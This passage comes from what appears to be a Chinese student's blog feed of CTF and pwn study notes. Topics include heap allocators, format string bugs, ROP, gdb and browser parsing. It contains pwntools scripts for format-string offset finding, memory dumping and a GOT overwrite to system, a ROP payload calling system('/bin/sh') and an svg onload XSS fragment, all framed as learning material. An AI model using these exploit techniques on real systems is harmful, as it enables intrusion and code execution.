<h3 id="这部分内容切到Windows"><a href="#这部分内容切到Windows" class="headerlink" title="这部分内容切到Windows"></a>这部分内容切到Windows</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">Free|0]   -&gt; ... 这个Free[0]比较特殊,连了介于1~512KB的空闲堆块,大小升序连接</div><div class="line">Free|0]   &lt;- ... 其他的连接的堆块连接的堆块大小为`Index * 8` byte</div><div class="line"></div><div class="line">Free|1]   -&gt; [8    ] -&gt; [8    ]  -&gt; [8    ] -&gt; [8    ] -&gt; Free[1]开头</div><div class="line">Free|1]   &lt;- [bytes] &lt;- [bytes]  &lt;- [bytes] &lt;- [bytes] &lt;- 来自Free[1]开头</div><div class="line">...</div><div class="line">Free|127] -&gt; [1016 ] -&gt; [1016 ] -&gt; [1016 ] -&gt; [1016 ] -&gt; Free[127]开头</div><div class="line">Free|127] &lt;- [bytes] &lt;- [bytes] &lt;- [bytes] &lt;- [bytes] &lt;- 来自Free[127]开头</div></pre></td></tr></table></figure>
<p>同时提到<code>快表</code><br>这是windows为了加快堆的分配而采用的一种堆表,这类单向链表不会发生堆合并(其中空闲块块首被设置为占用)<br>也是有128条,只是其中的堆块采用单链表组织,其他和普通空表类似</p>
<p>对于堆块的分配,对于大小不同的块,有不同分配方式</p>
<ul>
<li>小块: 快表分配 -&gt; 普通空表分配 -&gt; 堆缓存(我也不知道这个是啥)分配 -&gt; 零号空表分配 -&gt; NULL</li>
<li>大块: 堆缓存 -&gt; 零号空表分配</li>
<li><p>巨块: 虚分配</p>
</li>
<li><p>堆块大小Size是包含块首在内的,如果我们请求32字节,则实际会分配32+8(块首大小)字节,但空表里的大小应该是data的大小,不包含表头</p>
</li>
<li>堆块的单位是8字节,不足8字节按照8字节分配</li>
<li><p>初始状态下,快表空表都为空,不能精确分配,所以使用次优块(好像有的地方叫尾块,有的地方叫顶块)</p>
</li>
<li><p>快表只会精确匹配,快表每一条只允许有4项</p>
</li>
<li>快表单恋,比较快,所以分配和释放优先用快表</li>
</ul>
<p>都是书上看来的,我没有windows,暂时也不能试验</p>
<blockquote>
<p>那么如果我的快表里只有4个16字节的块,然而我的空表里也只有16字节的,那么我需要8字节的时候,是要切割普通空表里的这个16字节的块嘛,还是顶块分配</p>
</blockquote>
<h2 id="欢迎切换回来到linux"><a href="#欢迎切换回来到linux" class="headerlink" title="欢迎切换回来到linux"></a>欢迎切换回来到linux</h2><p>上面的是说windows的情况,现在回到Linux里glibc的<code>ptmalloc</code><br>然后在网上找到资料</p>
<h3 id="下面来自资料"><a href="#下面来自资料" class="headerlink" title="下面来自资料"></a>下面来自资料</h3><h4 id="bins"><a href="#bins" class="headerlink" title="bins"></a>bins</h4><blockquote>
<p>ptmalloc 将 heap 中<code>相似大小</code>的 chunk 用双向链表链接起来, 这样的一个链表被称为一个bin. ptmalloc 共维护了128个bin, 并使用一个数组来存储这些 bin<br>但,不太一样的地方在这里</p>
</blockquote>
<p>前64个bin叫做<code>exact bins</code>, 每一个 bin 分别包含了相同大小的chunk<br>后面的bin叫做<code>ordered bins</code>,每一个 bin 分别包含了一个给定范围内的chunk</p>
<h4 id="fast-bins"><a href="#fast-bins" class="headerlink" title="fast bins"></a>fast bins</h4><p>一般的情况是, 程序在运行时会经常需要分配和释放一些较小的内存空间. 当 allocator 合并了相邻的几个小的 chunk 之后, 也许马上就会有另一个小块内存的请求, 这样 allocator 又需要从大的空闲内存中分出一块出来, 这样无疑是比较低效的,所以就有了不合并的<code>fastbins</code>(就是win里面的<code>快表</code>)</p>
<p>不大于 max_fast (72 bytes) 的 chunk 被 free 后, 首先会被放到 fastbins 中, fastbins 中的 chunk 并不改变它的使用标志p. 这样也就无法将它们合并, 当需要给用户分配的 chunk 小于或等于 max_fast 时, ptmalloc 首先会在 fastbins 中查找相应的空闲块(具体的分配算法请参考第7节), 然后才会去查找 bins 中的空间 chunk. 在某个特定的时候, ptmalloc 会遍历 fastbins 中的 chunk, 将相邻的空闲 chunk 进行合并, 并将合并后的 chunk 放到 bins 中去.</p>
<h4 id="unsorted-bins"><a href="#unsorted-bins" class="headerlink" title="unsorted bins"></a>unsorted bins</h4><p>如果被用户释放的 chunk 大于 max_fast, 则按上面的叙述它应该会被放到 bins中. 但实际上, ptmalloc 还引入了一个称为 “unsorted bins”的队列. 这些大于 max_fast 的chunk 首先会被放到 “unsorted bins” 队列中, 在进行 malloc 操作的时候, 如果在 fastbins 中没有找到合适的 chunk, 则 ptmalloc 会先在 “unsorted bins”中查找合适的空闲 chunk, 然后才查找 bins. 如果 “unsorted bins” 不能满足分配要求. malloc 便会将 “unsorted bins” 中的 chunk 放到 bins 中, 然后再在 bins 中继续进行查找和分配过程. 从这个过程可以看出来, “unsorted bins”可以看做是 bins 的一个缓冲区, 增加它只是为了加快分配的速度(就是上面windows部分提到的<code>堆缓存</code>)</p>
<h4 id="top-chunk"><a href="#top-chunk" class="headerlink" title="top chunk"></a>top chunk</h4><p>在前面一直提到, ptmalloc 会预先分配一块较大的空闲内存(也就是所为的 heap), 而通过管理这块内存来响应用户的需求, 因为内存是按地址从低向高进行分配的, 在空闲内存的最高处, 必然存在着一块空闲 chunk, 叫做 “top chunk”. 当 bins 和 fastbins 都不能满足分配需要的时候, ptmalloc 会设法在 “top chunk” 中分出一块内存给用户, 如果 “top chunk” 本身不够大, 则 ptmalloc 会适当的增加它的大小(也就增加了 heap 的大小). 以满足分配的需要, 实际上, “top chunk” 在分配时总是在 ‘fastbins 和 bins 之后被考虑, 所以, 不论 “top chunk” 有多大, 它都不会被放到 fastbins 或者是 bins 中. (应该就是上面windows提到的<code>尾块</code>)</p>
<h4 id="mmaped-chunk"><a href="#mmaped-chunk" class="headerlink" title="mmaped chunk"></a>mmaped chunk</h4><p>当需要分配的 chunk 足够大, 而且 fastbins 和 bins 都不能满足要求, 甚至 “top chunk” 本身也不能满足分配需求时, ptmalloc 会使用 mmap 来直接使用内存映射来将页映射到进程空间(具体的情况, 请参考第6节). 这样分配的 chunk 在被 free 时将直接解除映射, 于是就将内存归还给了系统, 再次对这样的内存区的引用将导致一个 “segmentation fault” 错误. 这样的 chunk 也不会包含在任何 bin 中.(应该就是上面提到的巨块的<code>虚分配</code>)</p>
<h4 id="分配主要靠brk和mmap"><a href="#分配主要靠brk和mmap" class="headerlink" title="分配主要靠brk和mmap"></a>分配主要靠brk和mmap</h4><p>资料上具体过程写的有点乱,再找吧</p>
<p>当申请内存时，首先从具有相同大小的已经释放的堆块（或者大一点的堆块,言外之意就是可以切割稍大一点的空闲堆块）中查找并重新使用这段内存。仅仅当没有找到合适的堆块时才会使用顶块。</p>
<blockquote>
<p>当一个堆块释放了（通过调用free函数），它会检查之前的堆块是否被释放了。如果之前的堆块没有在使用，那么就会和当前的堆块合并。这样就会增加堆块的大小。结果就是这个堆块需要被放置在不同的链表中。这样的话，之前释放的堆块就需要首先从原来的空闲链表中删除(执行unlink操作),这个时候会改变bk,fd指针,就是利用的时候，接着再和当前堆块合并到另一个合适的链表中。从一个链表中删除一个堆块的代码如下：</p>
</blockquote>
<p>这个前后大概是说<code>在空间上chunk和chunk相邻的关系吧</code>,这个和链表中的前后关系无关</p>
<p>据说这是老版本glic里的<code>unlink</code><br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">unlink</span><span class="params">(malloc_chunk * P, malloc_chunk * BK, malloc_chunk * FD)</span> </span>&#123;</div><div class="line">    FD = P -&gt; fd;</div><div class="line">    BK = P -&gt; bk;</div><div class="line">    FD -&gt; bk = BK;</div><div class="line">    BK -&gt; fd = FD;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<h2 id="学习中"><a href="#学习中" class="headerlink" title="学习中"></a>学习中</h2><p>我的天，并没有学会TAT</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="http://www.tuicool.com/articles/E3Ezu2u" target="_blank" rel="external">http://www.tuicool.com/articles/E3Ezu2u</a> (包含了老版本的unlink和新版的)<br><a href="http://blog.csdn.net/heiyeshuwu/article/details/27325719" target="_blank" rel="external">http://blog.csdn.net/heiyeshuwu/article/details/27325719</a><br><a href="http://www.ms509.com/?p=49" target="_blank" rel="external">http://www.ms509.com/?p=49</a> (后来看到的)<br><a href="http://www.cnblogs.com/0xJDchen/category/885258.html" target="_blank" rel="external">http://www.cnblogs.com/0xJDchen/category/885258.html</a></p>
]]></content>
      
        
        <tags>
            
            <tag> pwn </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[再瞎说几句就回宿舍]]></title>
      <url>/2017/05/11/%E5%86%8D%E7%9E%8E%E8%AF%B4%E5%87%A0%E5%8F%A5%E5%B0%B1%E5%9B%9E%E5%AE%BF%E8%88%8D/</url>
      <content type="html"><![CDATA[<p>自己早不知道干啥去了,,,真是惨</p>
<p>想买一本<code>0day安全</code>再买一本<code>加密解密</code>，还有一本<code>程序员的自我修养</code></p>
<p>看超级厉害的某bendawang师傅的博客</p>
<p>感觉简直厉害到爆==，超级服气</p>
<p>什么时候能像他那样子</p>
]]></content>
      
        
    </entry>
    
    <entry>
      <title><![CDATA[printf]]></title>
      <url>/2017/05/11/printf/</url>
      <content type="html"><![CDATA[<p>天真的以为printf和其他普通的函数差不多，后来看格式化字符串漏洞的时候发现好像不太一样的</p>
<h2 id="someting"><a href="#someting" class="headerlink" title="someting"></a>someting</h2><p>当前的$ebp 处存的实际上是原来的$ebp<br>即用<code>x/wx $ebp</code>就能拿到caller的<code>$ebp</code>，喔，好像很显然对吧</p>
]]></content>
      
        
        <tags>
            
            <tag> pwn </tag>
            
            <tag> c </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[格式化字符串漏洞]]></title>
      <url>/2017/05/11/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/</url>
      <content type="html"><![CDATA[<h2 id="先看看能干什么"><a href="#先看看能干什么" class="headerlink" title="先看看能干什么"></a>先看看能干什么</h2><p>能用来绕过canary(2333 厉害了)</p>
<h2 id="怎么用"><a href="#怎么用" class="headerlink" title="怎么用"></a>怎么用</h2><p>还没学会</p>
<h2 id="后续"><a href="#后续" class="headerlink" title="后续"></a>后续</h2><p>看了找个师傅的觉得写的不错<br>链接 <a href="http://0x48.pw/2017/03/13/0x2c/" target="_blank" rel="external">http://0x48.pw/2017/03/13/0x2c/</a></p>
<p>根据文章说格式化字符串漏洞的作用就是读写内存(wc, 好强啊)</p>
<p>提到通过<code>%x</code>这样子来测试是不是存在漏洞</p>
<p>没有源码的pwn就需要格式化字符串漏洞把bin给dump下来(这算不算blind)</p>
<p>不过好像有种<code>blind rop</code>好像和这个不太一样的诶</p>
<blockquote>
<p>格式化字符串漏洞是怎么产生的？首先要有一个函数，比如read, 比如gets获取用户输入的数据储存到局部变量中，然后直接把该变量作为printf这类函数的第一个参数值</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line"></div><div class="line">context.log_level = <span class="string">'debug'</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">exec_fmt</span><span class="params">(payload)</span>:</span></div><div class="line">	p = process(<span class="string">"a.out"</span>)</div><div class="line">	p.sendline(payload)</div><div class="line">	info = p.recv()</div><div class="line">	p.close()</div><div class="line">	<span class="keyword">return</span> info</div><div class="line"></div><div class="line">autofmt = FmtStr(exec_fmt)</div><div class="line"><span class="keyword">print</span> autofmt.offset</div></pre></td></tr></table></figure>
<p>这里的FmtStr是pwn自带的，可以用它算出offset</p>
<blockquote>
<p>在Linux下，不开PIE保护时，32位的ELF的默认首地址为0x8048000，如果开启了PIE保护，则需要根据ELF的魔术头7f 45 4c 46进行爆破，内存地址一页一页的往前翻直到翻到ELF的魔术头为止</p>
</blockquote>
<p>另外要注意<code>\x00</code>的终止(截断)问题</p>
<p>利用<br>形如<code>%12$s</code> =&gt; 会显示第十二个参数所指的地址处的值 即为<code>Value(addr(arg[11]))</code><br>形如<code>%12$x</code> =&gt; 会显示第十二个参数的十六进制值 即为<code>Value(arg[11])</code><br>不知道理解对不对<br>所以在找offset的时候应该使用<code>%12$x</code> 比如<code>ABCD%11$x</code>看看能不能得到<code>ABCD44434241</code><br>而在找到offset后，要dump原始的bin的时候要使用<code>%12$s</code>比如<code>&quot;%13$saaa&quot; + p32(0x8048000)</code></p>
<p>dump 数据(读内存)<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line"></div><div class="line">context.log_level = <span class="string">'debug'</span></div><div class="line">f = open(<span class="string">'source.bin'</span>, <span class="string">'ab+'</span>)</div><div class="line"></div><div class="line">begin = <span class="number">0x8048000</span></div><div class="line">offset = <span class="number">0</span></div><div class="line"></div><div class="line"><span class="keyword">while</span> <span class="keyword">True</span>:</div><div class="line">    addr = begin + offset</div><div class="line">    p = process(<span class="string">'./xxxx'</span>)</div><div class="line">    p.sendline(<span class="string">'$13saaa'</span> + p32(addr))</div><div class="line">    <span class="keyword">try</span>:</div><div class="line">        info = p.recvuntil(<span class="string">'aaa'</span>)[:<span class="number">-3</span>]</div><div class="line">    <span class="keyword">except</span> EOFError:</div><div class="line">        <span class="keyword">print</span> offset</div><div class="line">        <span class="keyword">break</span></div><div class="line">    info += <span class="string">'\x00'</span></div><div class="line">    p.close()</div><div class="line">    offset += len(info)</div><div class="line">    f.write(info)</div><div class="line">    f.flush()</div><div class="line">f.close()</div></pre></td></tr></table></figure></p>
<p>向<code>printf_got</code>里写入<code>system_addr</code>以达到<code>hack got</code>的目的<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line"></div><div class="line">context.log_level = <span class="string">'debug'</span></div><div class="line">printf_got = <span class="number">0x804a010</span></div><div class="line">system_add = <span class="number">0xaaaaaaaa</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">exec_fmt</span><span class="params">(payload)</span>:</span></div><div class="line">	p.sendline(payload)</div><div class="line">	<span class="keyword">return</span> p.recv()</div><div class="line"></div><div class="line">p = remote(<span class="string">"127.0.0.1"</span>, <span class="number">10001</span>)</div><div class="line">autofmt = FmtStr(exec_fmt)</div><div class="line">payload = fmtstr_payload(autofmt.offset, &#123;printf_got: system_add&#125;)</div></pre></td></tr></table></figure></p>
<p>先就这样子了</p>
]]></content>
      
        
        <tags>
            
            <tag> pwn </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[琐碎]]></title>
      <url>/2017/05/11/%E7%90%90%E7%A2%8E/</url>
      <content type="html"><![CDATA[<p>明天要走了，作业还没写完</p>
<p>想学一下BROP</p>
<p>发现好像要先学格式化字符串漏洞，以用来绕过金丝雀</p>
<p>上次看的SROP还没学会</p>
<p>关于堆的还不会</p>
<p>我好菜啊</p>
<p>off by one<br>use after free</p>
]]></content>
      
        
        <tags>
            
            <tag> 周四 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[杂碎]]></title>
      <url>/2017/05/11/%E6%9D%82%E7%A2%8E/</url>
      <content type="html"><![CDATA[<h2 id="leave"><a href="#leave" class="headerlink" title="leave"></a>leave</h2><p>pop, push<br>call, ret, leave</p>
<p>这个leave的意思查查是等效做<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">movl %ebp, %esp</div><div class="line">popl %ebp</div></pre></td></tr></table></figure></p>
<p>这个<code>movl %ebp, %esp</code>…在做毛线<br>是在恢复栈顶指针<br>后来有文章提到，如果没有用到栈，就可以不恢复，直接用<code>popl %ebp</code><br>比如<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">int main() &#123;</div><div class="line">    return 0;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<blockquote>
<p>在intel的官方文档中使用intel语法，Windows也使用intel语法，而UNIX平台的汇编器一直使用AT&amp;T语法</p>
</blockquote>
<p>我的天哪，，我们一直学的是Intel语法，这里的leave是<code>AT&amp;T</code>语法</p>
<p>语法介绍见:<br>    <a href="http://www.cnblogs.com/orlion/p/5765339.html" target="_blank" rel="external">http://www.cnblogs.com/orlion/p/5765339.html</a><br>    <a href="http://blog.csdn.net/crazyboy2009/article/details/33817025" target="_blank" rel="external">http://blog.csdn.net/crazyboy2009/article/details/33817025</a></p>
<p>简单地说区别在于<br>ATT语法:<br>    第一个为源操作数，第二个为目的操作数<br>    寄存器前用%，立即数前加$<br>    指令操作码的最后一个字母表示操作数大小:<br>    b: byte(1), w: word(2), l: long(4)</p>
<h2 id="x86-和x64-区别"><a href="#x86-和x64-区别" class="headerlink" title="x86 和x64 区别"></a>x86 和x64 区别</h2><p><em>首先是内存地址的范围由32位变成了64位</em>。但是可以使用的内存地址不能大于0x00007fffffffffff，否则会抛出异常。<br><em>其次是函数参数的传递方式发生了改变</em>，x86中参数都是保存在栈上，但在x64中的前六个参数依次保存在RDI，RSI，RDX，RCX，R8和 R9中，如果还有更多的参数的话才会保存在栈上</p>
]]></content>
      
        
    </entry>
    
    <entry>
      <title><![CDATA[ROPgadget]]></title>
      <url>/2017/05/10/ROPgadget/</url>
      <content type="html"><![CDATA[<p>看到网上推荐的rop工具,就down了一份<code>ROPgadget</code></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">haibin$: ROPgadget --binary /lib/x86_64-linux-gnu/libc.so.6 --only <span class="string">"pop|ret"</span> | grep rdi</div></pre></td></tr></table></figure>
<p>看蒸米的文章里有</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">payload = &quot;\x00&quot;*136 + p64(pop_ret_addr) + p64(binsh_addr) + p64(system_addr)</div></pre></td></tr></table></figure>
<p>开始没看懂这个payload，还是太菜</p>
<p>用<code>p64(pop_ret_addr)</code>覆写了<code>ret_address</code>， 所以在ret的时候先跳到一个<code>pop rdi; ret</code>的地方<br>这个时候栈顶应该已经是<code>p64(binsh_addr) + p64(system_addr)</code> 这部分内容了<br>所以这个时候<code>pop rdi</code>就把<code>p64(binsh_addr)</code>pop到了<code>$rdi</code>里作为第一个参数<br>然后<code>ret</code>跳到<code>p64(system_addr)</code>,然后起来shell?好像很完美的样子….</p>
]]></content>
      
        
        <tags>
            
            <tag> pwn </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[gdb]]></title>
      <url>/2017/05/10/gdb/</url>
      <content type="html"><![CDATA[<p>好吧，承认我连gdb都不怎么会用，只会r一下，break一下，p一下。。。</p>
<p>发现一份<code>张银奎</code>巨佬的ppt<code>gdb基础</code></p>
<h2 id="Convenience-Variables"><a href="#Convenience-Variables" class="headerlink" title="Convenience Variables"></a>Convenience Variables</h2><p>GDB维护的伪变量, $开头<br>$ most recent displayed value<br>$ $n nth displayed value<br>$ $$ displayed value previous to $<br>$ $$n nth displayed value back from $</p>
<p>可以使用set命令定义<br>set $foo = *object_ptr</p>
<h2 id="Gdb-variables"><a href="#Gdb-variables" class="headerlink" title="Gdb variables"></a>Gdb variables</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">(gdb) set $foo = 4</div><div class="line">(gdb) p $foo</div><div class="line">$3 = 4</div></pre></td></tr></table></figure>
<h2 id="Register-Variables"><a href="#Register-Variables" class="headerlink" title="Register Variables"></a>Register Variables</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">(gdb) break write if $rsi == 2</div></pre></td></tr></table></figure>
<h2 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h2><p>break(b): 软件断点<br>watch: 硬件断点(其实我从来没打过这个)<br>backtrace(bt): 显示函数调用序列(栈回溯)<br>continue(c): 恢复执行<br>next/step(n/s): 单步<br>x: 观察内存<br>info locals: 观察局部变量<br>pt: 观察数据结构<br>finish: 执行到函数返回<br>frame: 查看当前栈帧<br>i shared: 列模块</p>
<h2 id="附加"><a href="#附加" class="headerlink" title="附加"></a>附加</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">gdb --pid=&lt;n&gt;</div></pre></td></tr></table></figure>
<p>or<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">attach process-id</div></pre></td></tr></table></figure></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">detach  =&gt; 分离</div><div class="line">quit    =&gt; 杀死</div></pre></td></tr></table></figure>
<h2 id="调用函数"><a href="#调用函数" class="headerlink" title="调用函数"></a>调用函数</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">call sum(1, 2)      #call sum and print ret value</div></pre></td></tr></table></figure>
<h2 id="查看变量和内存"><a href="#查看变量和内存" class="headerlink" title="查看变量和内存"></a>查看变量和内存</h2><h3 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">print [/f] [expr]</div><div class="line">    f format:</div><div class="line">        x hex</div><div class="line">        d signed decimal</div><div class="line">        u unsigned decimal</div><div class="line">        o octal</div><div class="line">        t binary</div><div class="line">        a address, absolute and relative</div><div class="line">        c character</div><div class="line">        f floating point</div></pre></td></tr></table></figure>
<h3 id="内存"><a href="#内存" class="headerlink" title="内存"></a>内存</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">x [/Nuf] expr</div><div class="line">    N count of how many units to display</div><div class="line">    u unit size, one of:</div><div class="line">        b individual bytes</div><div class="line">        h halfwords</div><div class="line">        w words</div><div class="line">        g giant words</div><div class="line">    f printing format, Any `print` format or,</div><div class="line">        s null-terminated string(就是一条string啦)</div><div class="line">        i machine instructions</div></pre></td></tr></table></figure>
<p>经常用<code>x/10s $esp</code> 或者 <code>x/gx $rsp</code>之类的命令</p>
<h2 id="其他的"><a href="#其他的" class="headerlink" title="其他的"></a>其他的</h2><p>gcc 在编译时候的 <code>-g</code> 选项 是为了 <code>generate debugging information</code></p>
<h2 id="要回宿舍了，要被蚊子要死了，醉了"><a href="#要回宿舍了，要被蚊子要死了，醉了" class="headerlink" title="要回宿舍了，要被蚊子要死了，醉了"></a>要回宿舍了，要被蚊子要死了，醉了</h2>]]></content>
      
        
        <tags>
            
            <tag> gdb </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[关于浏览器]]></title>
      <url>/2017/05/10/%E5%85%B3%E4%BA%8E%E6%B5%8F%E8%A7%88%E5%99%A8/</url>
      <content type="html"><![CDATA[<ol>
<li><p><svg onload="xxx"><br/>一直不知道这个<code>/</code>起到什么作用，今天看到某本书中提到</svg></p>
<blockquote>
<p><code>/</code>在标签中被视为结束符号，仅仅是在他后面跟着尖括号的时候。如果他出现在其他地方(值的范围除外)的时候，那么他会被当做空格对待<br>所以这个<code>/</code>就是可以作为tag名和属性的分隔符号，看作空格</p>
</blockquote>
</li>
<li><p>模式<br>回车在纯文本模式(i.e. a.txt)和在混合文本模式中表现不同</p>
<blockquote>
<p>我理解view-source 也算是纯文本模式<br>混合文本模式下回车只会被当做一个空格</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></div><div class="line">123</div><div class="line">456</div><div class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></div></pre></td></tr></table></figure>
</blockquote>
</li>
</ol>
<p>渲染出来后 123 456 在同一行</p>
<ol>
<li><p>空白字符<br>chrome: 空格(0x20), 缩进(0x09), 回车(0x0a), 换行(0x0c), 0x00<br>IE: 空格和ASCII为9~12(缩进, 换行, 垂直制表, 换页)的字符以及回车(ASCII 13)</p>
</li>
<li><p>浏览器在解析html的时候将html实体就转化了</p>
</li>
</ol>
]]></content>
      
        
    </entry>
    
    <entry>
      <title><![CDATA[todo]]></title>
      <url>/2017/05/08/todo-1/</url>
      <content type="html"><![CDATA[<ol>
<li><p>beautifulSoup 大概就是解析html的库?</p>
<ul>
<li>所以爬虫大概就是模拟请求然后解析一下?</li>
</ul>
</li>
<li><p>看看有没有验证码识别的库，原理，这个啥都不会</p>
</li>
<li><p>下午水一下趋势的视频面试，悲哀的是忘记请假，只能逃课了，我的单片机，已经逃过一节课了，以为其他班老师一样，去补了其他老师的课，结果md，不是一个老师，听了两节课的的历史，各个公司单片机的兴衰</p>
</li>
<li><p>等师傅给我回复看能不能买高铁二等，不能的话就买火车票了，怕是再不买要走着去了，走着去正好能倒贴主办方火车票钱，perfect，但要周四出发</p>
</li>
<li><p>补一补上次hbctf的web题，补一补ssctf的web</p>
</li>
<li><p>看蒸米的rop教程</p>
</li>
<li><p>看机器学习公开课</p>
</li>
<li><p>说了好久补算法</p>
</li>
<li><p>学c++</p>
</li>
<li><p>背单词</p>
</li>
<li><p>跑步</p>
</li>
<li><p>督促学弟学妹学习，醉了，这是最。。。</p>
</li>
<li><p>补web题，补pwn</p>
</li>
<li><p>学操作系统，看到csapp太厚了</p>
</li>
<li><p>报夏令营</p>
</li>
<li><p>py: flask, redis<br>js: react, omi, xss bot<br>sql: sqli-labs  <em>自己手注真是太菜了</em></p>
</li>
<li><p>数论书还有抽象代数书还没看完</p>
</li>
</ol>
]]></content>
      
        
        <tags>
            
            <tag> 周一 </tag>
            
            <tag> todo </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[FF in ubuntu 不显示菜单栏]]></title>
      <url>/2017/05/06/FF-in-ubuntu-%E4%B8%8D%E6%98%BE%E7%A4%BA%E8%8F%9C%E5%8D%95%E6%A0%8F/</url>
      <content type="html"><![CDATA[<p>好坑啊。。。一直找不到，，想用tamper data找不到菜单栏</p>
<p>发现按一下<code>alt</code>可以显示一下，暂且这样吧</p>
]]></content>
      
        
    </entry>
    
    <entry>
      <title><![CDATA[困扰了我一万年的burp的乱码问题]]></title>
      <url>/2017/05/06/%E5%9B%B0%E6%89%B0%E4%BA%86%E6%88%91%E4%B8%80%E4%B8%87%E5%B9%B4%E7%9A%84burp%E7%9A%84%E4%B9%B1%E7%A0%81%E9%97%AE%E9%A2%98/</url>
      <content type="html"><![CDATA[<p>简直要气死，设置了字体和编码还是有的地方会乱成一团</p>
<p>后来才发现是<code>gzip</code>的问题</p>
<p>要开启<br><code>proxy</code> =&gt; <code>Options</code> =&gt; <code>Miscellaneous</code> =&gt; <code>unpack gzip xxxx</code></p>
<p>就可以了</p>
<p>在做ssctf web的时候突然发现</p>
]]></content>
      
        
        <tags>
            
            <tag> issue </tag>
            
            <tag> burp </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[unistd.h & windows.h]]></title>
      <url>/2017/05/05/unistd-h-windows-h/</url>
      <content type="html"><![CDATA[<p>这几天才知道有<code>unistd.h</code>这样一个头文件存在<br>是因为用到<code>read</code>和<code>write</code>函数<br>因为很少写系统依赖的东西还是写东西太少<br>i’m good vegetable…</p>
<p>然后立即想到了windows下的<code>windows.h</code><br>感觉他们地位差不多???</p>
<p>刚刚丧病的发现bash居然可以设置成vi模式，查了一下拿来默认是<code>emacs</code>的<br>只要bashrc加一句<code>set -o vi</code><br>…醉了</p>
]]></content>
      
        
    </entry>
    
    <entry>
      <title><![CDATA[pwn无法入门4|leak]]></title>
      <url>/2017/05/05/pwn%E6%97%A0%E6%B3%95%E5%85%A5%E9%97%A84-leak/</url>
